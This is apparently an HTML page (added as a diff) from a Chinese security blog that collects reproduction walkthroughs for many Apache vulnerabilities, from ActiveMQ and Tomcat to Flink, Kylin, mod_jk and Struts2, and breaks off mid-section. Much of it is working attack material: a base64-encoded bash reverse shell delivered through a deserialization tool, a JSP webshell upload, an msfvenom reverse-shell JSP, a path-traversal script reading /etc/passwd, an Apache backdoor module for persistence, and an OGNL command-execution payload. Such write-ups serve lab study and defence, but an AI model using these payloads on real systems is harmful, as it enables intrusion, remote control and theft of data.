@@ -1,0 +1,1320 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>Apache漏洞复现 | 0opsdc</title>
+<meta name=keywords content="漏洞复现">
+<meta name=description content="Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。
+影响版本 Apache Airflow 1.10.3以下版本。
+漏洞复现 访问/admin/dagrun/(默认不需要密码)。
+创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：
+<script>_a=&#34;https://www.baidu.com&#34;</script> <script>document.location=_a</script> 能直接造成存储型XSS。
+ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。
+影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。
+复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。
+2.作为一个消息，发送给目标对应端口。
+3.访问Web管理页面，读取消息，触发漏洞。
+漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)
+ 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。
+jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
+ 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &#34;touch /tmp/vuln&#34; -Yp ROME <ip> <port> # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:<server-id> INFO d.">
+<meta name=author content="0opsdc">
+<link rel=canonical href=https://examplesite.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-123-45','auto'),ga('send','pageview'))</script><meta property="og:title" content="Apache漏洞复现">
+<meta property="og:description" content="Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。
+影响版本 Apache Airflow 1.10.3以下版本。
+漏洞复现 访问/admin/dagrun/(默认不需要密码)。
+创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：
+<script>_a=&#34;https://www.baidu.com&#34;</script> <script>document.location=_a</script> 能直接造成存储型XSS。
+ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。
+影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。
+复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。
+2.作为一个消息，发送给目标对应端口。
+3.访问Web管理页面，读取消息，触发漏洞。
+漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)
+ 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。
+jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
+ 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &#34;touch /tmp/vuln&#34; -Yp ROME <ip> <port> # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:<server-id> INFO d.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://examplesite.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><meta property="og:image" content="https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
+<meta property="og:site_name" content="0opsdc">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
+<meta name=twitter:title content="Apache漏洞复现">
+<meta name=twitter:description content="Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。
+影响版本 Apache Airflow 1.10.3以下版本。
+漏洞复现 访问/admin/dagrun/(默认不需要密码)。
+创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：
+<script>_a=&#34;https://www.baidu.com&#34;</script> <script>document.location=_a</script> 能直接造成存储型XSS。
+ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。
+影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。
+复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。
+2.作为一个消息，发送给目标对应端口。
+3.访问Web管理页面，读取消息，触发漏洞。
+漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)
+ 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。
+jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
+ 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &#34;touch /tmp/vuln&#34; -Yp ROME <ip> <port> # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:<server-id> INFO d.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://examplesite.com/post/"},{"@type":"ListItem","position":2,"name":"Apache漏洞复现","item":"https://examplesite.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Apache漏洞复现","name":"Apache漏洞复现","description":"Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。\n影响版本 Apache Airflow 1.10.3以下版本。\n漏洞复现 访问/admin/dagrun/(默认不需要密码)。\n创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：\n\u0026lt;script\u0026gt;_a=\u0026#34;https://www.baidu.com\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.location=_a\u0026lt;/script\u0026gt; 能直接造成存储型XSS。\nActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。\n影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。\n复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。\n2.作为一个消息，发送给目标对应端口。\n3.访问Web管理页面，读取消息，触发漏洞。\n漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)\n 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。\njmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。\n 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \u0026#34;touch /tmp/vuln\u0026#34; -Yp ROME \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:\u0026lt;server-id\u0026gt; INFO d.","keywords":["漏洞复现"],"articleBody":"Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。\n影响版本 Apache Airflow 1.10.3以下版本。\n漏洞复现 访问/admin/dagrun/(默认不需要密码)。\n创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：\nscript_a=\"https://www.baidu.com\"script scriptdocument.location=_ascript 能直接造成存储型XSS。\nActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。\n影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。\n复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。\n2.作为一个消息，发送给目标对应端口。\n3.访问Web管理页面，读取消息，触发漏洞。\n漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)\n 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。\njmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。\n 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/vuln\" -Yp ROME   # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID: INFO d.c.j.t.JMSTarget [main] Sent gadget \"ROME\" with command: \"touch /tmp/vuln\" INFO d.c.j.t.JMSTarget [main] Shutting down connection ID: 访问http://:/admin/browse.jsp?JMSDestination=event查看消息队列，访问页面需要登录，默认账密如下：\nadmin/admin\r点击页面Message ID下的ID:server-id字段触发文件创建命令，在受害端查看命令是否执行成功：\nls /tmp 确认/tmp/vuln文件存在后即可进一步创建反弹shell。\nbash -i \u0026 /dev/tcp// 0\u00261 # Base64编码 YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i} # 发送payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i}\" -Yp ROME   # INFO如下 INFO d.c.j.t.JMSTarget [main] Connected with ID： ID： INFO d.c.j.t.JMSTarget [main] Sent gadget \"ROME\" with command： \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNi4yMzMuNzYvODg4MyAwPiYx}|{base64,-d}|{bash,-i}\" INFO d.c.j.t.JMSTarget [main] Shutting down connection ID： 执行成功后，在监听端打开nc：\nnc -lvvp  继续到http://:/admin/browse.jsp?JMSDestination=event页面，点击字段触发反弹shell，成功连接。\nActiveMQ 任意文件写入漏洞 CVE-2016-3088 漏洞描述 ActiveMQ中的FileServer服务允许用户通过PUT方法上传文件到指定目录。FileServer是存储文件的接口，支持写入文件（不解析jsp）、移动文件（Move）。\n影响版本 ActiveMQ 5.x ~ 5.14.0，但在5.12.x ~ 5.13.x版本中默认关闭fileserver应用(可在conf/jetty.xml中开启)。在5.14.0版本后fileserver应用被彻底删除。\n复现思路 1.PUT一个webshell到fileserver目录。\n2.若不能执行则移动webshell到有权限目录。\n漏洞复现 访问http://:8161，先登录，默认账密：\nadmin/admin\r使用bp构造如下请求包：\nPUT /fileserver/a.jsp HTTP/1.1 Host: ip:port Cache-Control: max-age=0 Authorization: Basic YWRtaW46YWRtaW4= Upgrade-Insecure-Requests： 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT Connection: close Content-Length: 349 %@ page import=\"java.io.*\"% % out.print(\"Hellobr\"); String strcmd = request.getParameter(\"cmd\"); String line = null; Process p = Runtime.getRuntime().exec(strcmd); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); while((line = br.readLine()) != null){ out.print(line + \"br\"); } % 响应包如下：\nHTTP/1.1 204 No Content Connection: close Server: Jetty(8.1.16.v20140903) 查看webshell能否执行：http://:/fileserver/a.jsp，发现文件原样输出，没有被解析，当前目录没有执行权限。所以需要考虑移动文件至/webapps/api或/webapps/admin可解析jsp的目录下。\n要移动文件，必然就需要路径，以下为两种获取路径的方法：\n1.访问http://:8161admin/test/systemProperties.jsp\n2.构造错误上传路径，爆出绝对路径，如：\nPUT /fileserver/a/b HTTP/1.1 实测ActiveMQ 5.11.1版本无法利用。\n使用第一种方法，查看到文件路径为root/apache-activemq-5.11.1，下面把a.jsp文件移动到/webapps/admin目录下，构造包如下：\nMOVE /fileserver/a.jsp HTTP/1.1 Destination: file：///root/apache-activemq-5.11.1/webapps/admin/a.jsp Host: :8161 Cache-Control: max-age=0 Authorization: Basic YWRtaW46YWRtaW4= Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 If-Modified-Since: Fri, 13 Feb 2015 18:05:11 GMT Connection: close 响应包如下：\nHTTP/1.1 204 No Content Connection: close Server: Jetty(8.1.16.v20140903) 此时我们就可以使用webshell了：http://:8161/admin/a.jsp?cmd=ls。\nDDOS CVE-2007-6750 漏洞描述 Apache HTTP服务器2.2.15之前版本中缺少mod_ReqTimeout模块，1.x和2.x版本允许远程攻击者通过部分HTTP请求造成拒绝服务（守护进程中断），如Slowloris。\n影响版本 Apache 1.x ~ 2.x\n复现思路 1.检查存活。\n2.msf进一步验证。\n漏洞复现 首先使用nmap查看Apache版本：\nnmap -sV -p80  然后进一步访问网页，查看网页是否正常。\n使用msf执行攻击：\nmsfconsole # 启动metasploit use auxiliary/dos/http/slowloris # 使用模块 set RHOST  # 设置目标IP run # 执行攻击 HTTPd 多后缀解析漏洞 漏洞描述 Apache HTTPD支持一个文件拥有多个后缀并根据不同后缀执行不同指令，示例配置文件如下：\nAddType text/html .html\rAddLanguage zh-CN .cn\r配置文件给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，若用户请求文件index.cn.html，服务器将返回一个中文html页面。这就是Apache多后缀特性。\n若运维人员给.php后缀增加了处理器：\nAddHandler application/x-httpd-php .php\r在有多个后缀的情况下，只要一个文件含有.php后缀，那么其将被识别为php文件，利用这个特性我们就可以构造绕过上传限制的解析漏洞。\n复现思路 修改文件名为xxx.php.jpg绕过文件上传限制。\n漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/httpd/apache_parsing_vulnerability docker-compose up -d 首先正常上传一个php文件，显示文件类型不支持报错。\n将文件后缀改为xxx.php.jpg，成功上传并获取文件路径，访问即可。\nHTTPd 换行解析漏洞 CVE-2017-15715 漏洞描述 Apache HTTPd是一款HTTP服务器，可以通过mod_php来运行PHP网页。其2.4.0 ~ 2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，能够绕过一些服务器的安全策略。\n影响版本 Apache HTTPd 2.4.0 ~ 2.4.29\n复现思路 抓包给文件后缀加上0a换行符。\n漏洞复现 环境搭建：\ngit clone https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d 直接点击上传文件会被拦截，查看配置文件如下：\n \\.php$ SetHandler application/x-httpd-php  DirectoryIndex disabled DirectoryIndex index.php index.html  /var/www/ Options -Indexes AllowOverride All  前三行配置是将以.php为后缀的文件内容当作PHP代码进行解析，但使用了$进行文件匹配。\n$在正则表达式中是匹配字符串中结尾的位置，若存在换行符，则匹配换行符为结尾，可以通过这个缺陷绕过黑名单机制实现文件上传。\n抓包发送至Repeater模块，在文件后缀加上%0a绕过限制，上传成功，访问http://:/test.php%0a成功触发解析漏洞。\nFlink 目录遍历漏洞 CVE-2020-17519 漏洞描述 远程攻击者通过REST API目录遍历，可造成文件读写的影响。\n影响版本 Apache Flink 1.11.0 ~ 1.11.2\n复现思路 漏洞复现 FOFA：app=\"Apache Flink\"\n环境搭建：vulhub/flink/CVE-2020-17519 at master · vulhub/vulhub (github.com)\nPOC：\nhttp:///jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd\r漏洞利用POC：\nimport requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Flink 1.11.0-1.11.2 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-17519.py \\033[0m') print('+ \\033[36mUrl  http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mFile  /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): file_name = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 请求URL : {}\\033[0m\".format(vuln_url)) if \"root\" in response.text: print(\"\\033[32m[o] 目标 {}存在漏洞,成功读取 /etc/passwd ，响应为：\\n{}\\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, file_name): file_name_re = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name_re) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 请求URL : {}\\033[0m\".format(vuln_url)) if \"error\" not in response.text: print(\"\\033[32m[o] 目标 {}存在漏洞,成功读取 {}，响应为：\\n{}\\033[0m\".format(target_url, file_name, response.text)) else: print(\"\\033[31m[x] 目标文件{}读取失败\\033[0m\".format(file_name)) except Exception as e: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl  \\033[0m\")) file_name = \"/etc/passwd\" POC_1(target_url, file_name) while True: file_name = input(\"\\033[35mFile  \\033[0m\") if file_name == \"exit\": sys.exit(0) else: POC_2(target_url, file_name) 使用方式：python3 poc.py\nUrl ：：\nFile ：/etc/hosts\n后门维持 漏洞描述 通过第三方脚本实现维持后门。\n复现思路 1.上传文件\n2.重启服务\n3.执行脚本\n漏洞复现 工具下载：ianxtianxt/apache-： apache权限维持后门 (github.com)\n1.上传mod_backdoor.c到服务器，并执行命令：\napxs -i -a -c mod_backdoor.c \u0026\u0026 service apache2 restart 2.控制端执行脚本：\npython exploit.py  80 Mod_jk 访问控制权限绕过 CVE-2018-11759 漏洞描述 Apache Tomcat JK(mod_jk) Connector是Apache软件基金会为Apache或IIS提供连接后台Tomcat的模块，为Apache或IIS服务器提供处理JSP/Servlet的能力。\n由于httpd和Tomcat在路径处理规范上存在差异，httpd将url中的分号视作路径解析中的普通字符，而Tomcat将其当作查询分隔符(类似\"?\")。如，攻击者获取到路径：http://server/java_app/.. ;，对httpd来说，这并不会触发服务器并跳转到相应目录，仅仅被原封不动转发到Tomcat，且地址尾部被解析为.. *。这就允许攻击者获取到本不能在Tomcat访问的资源。\njkstatus是mod_jk模块的管理界面，设为读写权限时，允许配置AJP连接Java Web服务器代理HTTP请求，我们可以绕过Apache mod_jk Connector由JkMount httpd指令所定义端点的访问控制限制。如果能访问一个只有只读权限的jkstatus的接口，那么就有可能能够公开由mod_jk模块给AJP提供服务的内部路由。 如果能访问一个具有读写权限的jkstatus接口，我们就能通过修改AJP的配置文件中相关配置来劫持或者截断所有经过mod_jk的流量，或者进行内部端口扫描。\n影响版本 Apache Mod_jk Connector 1.2.0 ~ 1.2.44\n漏洞复现 环境搭建：\ngit clone https://github.com/immunIT/CVE-2018-11759.git docker-compose up -d 访问http://:80成功后，访问http://:80/jkstatus，显示无权限，通常使用如下httpd指令限制对jkstatus的访问：\n /jkstatus JKMount jk-status Require ip 127.0.0.1  在URL后加一个分号即可绕过限制，http://:80/jkstatus;。\n我们还可在分号之后提交GET参数，向jkstatus请求修改其访问权限的配置，如：http://:80/jkstatus;?cmd=dump。\n参数若能被解析，其产生的影响就等同于更改工作人员使用的端口来实现对所有由mod_jk供应的应用程序拒绝服务的效果，此外，若攻击者将相应AJP连接到自己的服务器上，就可能劫持所有到由mod_jk供应服务的Web应用的流量。\n从理论上说，将AJP的目标和端口修改为内部主机及其对应端口后，由于httpd和Tomcat的jkstatus返回错误信息不一致，我们能进行内部TCP端口扫描，具体情况取决于提交的AJP端口是否有效。\nKylin Console 控制台弱口令 漏洞描述 默认账密admin/KYLIN。\n影响版本 Apache Kylin\n漏洞复现 打开站点输入默认账密。\nKylin 未授权配置泄露 CVE-2020-13937 漏洞描述 Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息。\n影响版本 Apahche Kylin 2.x.x\nApahche Kylin Apahche Kylin 4.0.0-alpha\n漏洞复现 POC：http:///kylin/api/admin/config\n漏洞检测POC：\nimport requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Kylin 2.x.x \\033[0m') print('+ \\033[36m使用格式: python3 cve-2019-13937.py \\033[0m') print('+ \\033[36mUrl  http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"config\" in response.text: print(\"\\033[32m[o] 存在Apache Kylin的未授权配置泄露\\n[o] 响应为：\\n\\033[0m\",response.text) else： print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl  \\033[0m\")) POC_1(target_url) RCE CVE-2017-12615 漏洞描述 conf/web.xml文件配置错误中的readonly参数默认为false，攻击者可以使用PUT/DELETE请求方法操作文件。如通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP文件，JSP文件中的恶意代码将能被服务器执行，导致服务器数据泄露或获取服务器权限。\n影响版本 Apache Tomcat 7.0.0 ~ 7.0.81\n复现思路 1.msf生成jsp马\n2.PUT上传文件\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d msf生成jsp马：\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw  shell.jsp PUT上传jsp马：\ncurl -v -X PUT --data-binary @shell.jsp \"http：//:/shell.jsp/\" Shiro 反序列化漏洞 CVE-2016-4437 漏洞描述 Apache Shiro是一款开源的安全框架，提供身份验证、授权、密码学及会话管理功能。Shiro框架直观易用，也能提供健壮的安全性。Apache Shiro 1.2.4及之前版本中，加密的用户信息序列化后存放在名为remember-me的Cookie中，攻击者可以使用Shiro的默认密钥来伪造用户Cookie触发反序列化漏洞，进行在目标机器执行任意命令。\n影响版本 Apach Shiro 复现思路 漏洞复现 环境复现：\nhttps://github.com/vulhub/vulhub.git cd vulhub/shiro/CVE-2016-4437 docker-compose up -d Struts2 S2-001 表单验证错误远程利用 CVE-2007-4556 漏洞描述 S2-001 - Apache Struts 2 Wiki - Apache Software Foundation\n用户提交表单数据失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应表单数据中。\n影响版本 Apache Struts 2.0.0 ~ 2.0.8\n漏洞复现 环境搭建：\ngitclone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-001 docker-compose up -d 在用户名处输入如下POC：\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"id\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} 密码随便输。\n成功执行id命令，可以在new java.lang.String[]{\"\"}中的输入想执行的命令。\nStruts2 S2-002 和标记上的XSS漏洞 漏洞描述 S2-002 - Apache Struts 2 Wiki - Apache Software Foundation\n对于和标签，可以在构造和呈现标签的结果URL时注入不能正确转义的参数值。如： 